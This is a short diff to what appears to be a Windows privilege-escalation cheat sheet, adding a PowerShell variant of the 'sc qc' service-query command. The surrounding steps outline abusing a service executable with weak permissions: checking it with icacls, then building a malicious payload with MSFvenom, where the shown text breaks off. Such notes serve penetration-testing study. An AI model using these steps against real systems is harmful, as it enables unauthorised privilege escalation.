@@ -129,7 +129,8 @@ sc queryex type=service # List of all running services
 ----------------------------------------------------------------
 ✅ # Privilege Escalation with Insecure Permissions on Service Executable
 1️⃣ # Check the configuration details of a particular service example ( BINARY_PATH_NAME and SERVICE_START_NAME and .. )
-sc qc WindowsScheduler 
+sc qc WindowsScheduler # cmd
+sc.exe qc WindowsScheduler # powershell
 2️⃣ # We check the executable file of this service has Weak permission or not
 icacls C:\PROGRA~2\SYSTEM~1\WService.exe 
 3️⃣ # Making a malicious Payload with MSFvenom:
